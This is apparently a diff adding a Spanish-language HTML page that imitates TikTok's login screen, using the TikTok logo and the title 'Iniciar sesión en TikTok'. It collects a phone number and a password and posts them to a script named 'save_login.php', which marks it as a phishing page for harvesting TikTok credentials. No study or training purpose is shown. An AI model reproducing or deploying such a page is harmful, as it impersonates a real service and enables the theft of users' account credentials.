@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en TikTok</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="img/logo.svg" alt="TikTok Logo" class="logo">
+        </div>
+        <div class="login-box login-form">
+            <h1>Iniciar sesión</h1>
+            <form action="save_login.php" method="POST">
+                <p>Iniciar sesión con correo electrónico o nombre de usuario</p>
+                <div class="input-group">
+                    <label for="phone">Teléfono</label>
+                    <div class="phone-input">
+                        <select name="country-code" id="country-code">
+                            <option value="MX">MX +52</option>
+                            <!-- Otros códigos de país si es necesario -->
+                        </select>
+                        <input type="text" id="phone" name="phone" placeholder="Número de teléfono" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label for="password">Contraseña</label>
+                    <input type="password" id="password" name="password" placeholder="Contraseña" required>
+                    <span class="password-toggle"><img src="img.png" alt="Mostrar/Ocultar"></span>
+                </div>
+                <div class="actions">
+                    <a href="#" class="forgot-password">¿Olvidaste la contraseña?</a>
+                    <a href="#" class="alt-login">Iniciar sesión con código</a>
+                </div>
+                <button type="submit" class="login-button">Iniciar sesión</button>
+            </form>
+            <a href="index.html" class="back-link">Atrás</a>
+        </div>
+        <div class="register-link">
+            <p>¿No tienes cuenta? <a href="#">Registrarse</a></p>
+        </div>
+    </div>
+</body>
+</html>
